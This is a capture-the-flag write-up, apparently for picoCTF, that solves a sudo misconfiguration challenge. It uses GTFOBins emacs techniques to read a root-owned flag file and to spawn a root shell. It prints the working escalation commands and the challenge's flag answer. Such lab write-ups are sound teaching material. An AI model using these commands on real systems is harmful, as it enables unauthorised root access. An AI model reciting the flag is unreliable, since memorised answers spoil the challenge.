Author: Darkraicg492

#### Description

Can you read the flag? I think you can!

---

So I logged in and did `ls`

```bash
ctf-player@challenge:~$ ls
flag.txt
ctf-player@challenge:~$ cat flag.txt
cat: flag.txt: Permission denied
```

But yeah I wouldn't be that easy :)

SO I checked the permissions

```bash
ctf-player@challenge:~$ ls -lah
total 16K
drwxr-xr-x 1 ctf-player ctf-player   20 Mar 10 11:34 .
drwxr-xr-x 1 root       root         24 Mar  9 21:32 ..
-rw-r--r-- 1 ctf-player ctf-player  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 ctf-player ctf-player 3.7K Feb 25  2020 .bashrc
drwx------ 2 ctf-player ctf-player   34 Mar 10 11:34 .cache
-rw-r--r-- 1 ctf-player ctf-player  807 Feb 25  2020 .profile
-r--r----- 1 root       root         31 Mar  9 21:32 flag.txt
```

Now as always we should check if we have any executable with root priveldges and we enter `sudo -l`

```bash
ctf-player@challenge:~$ sudo -l
Matching Defaults entries for ctf-player on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User ctf-player may run the following commands on challenge:
    (ALL) NOPASSWD: /bin/emacs
```

Meaning we can make use of `/bin/emacs` but how exactly
For that we need to go to [GTFObins](https://gtfobins.org/gtfobins/emacs/) and as we need to read file we can make use of

We got three options (For `sudo` just use `sudo` in front of the command)

### Shell[](https://gtfobins.org/gtfobins/emacs/#shell)

This executable can spawn an interactive system shell.

- Unprivileged
  This function can be performed by any unprivileged user.
  ```
  emacs -Q -nw --eval '(term "/bin/sh")'
  ```

### File write[](https://gtfobins.org/gtfobins/emacs/#file-write)

This executable can write data to local files.

- Unprivileged
  This function can be performed by any unprivileged user.
  ```
  emacs /path/to/output-file
  DATA
  C-x C-s
  ```
  Remarks
  The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data.

### File read[](https://gtfobins.org/gtfobins/emacs/#file-read)

This executable can read data from local files.

- Unprivileged
  This function can be performed by any unprivileged user.
  ```
  emacs /path/to/input-file
  ```
  Remarks
  The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data.

### Getting the flag

Thus we will first try to read the file and after that will try to get root

1. Read file using `ctf-player@challenge:~$ sudo /bin/emacs flag.txt`

   ```bash
   picoCTF{ju57_5ud0_17_9a782247}
   ```

2. Now let's try to take over as a root with
   ```bash
   ctf-player@challenge:~$ sudo /bin/emacs -Q -nw --eval '(term "/bin/sh")'
   ```

```bash
# whoami
root
# cat flag.txt
picoCTF{ju57_5ud0_17_9a782247}
```

Thus we also got the root access.
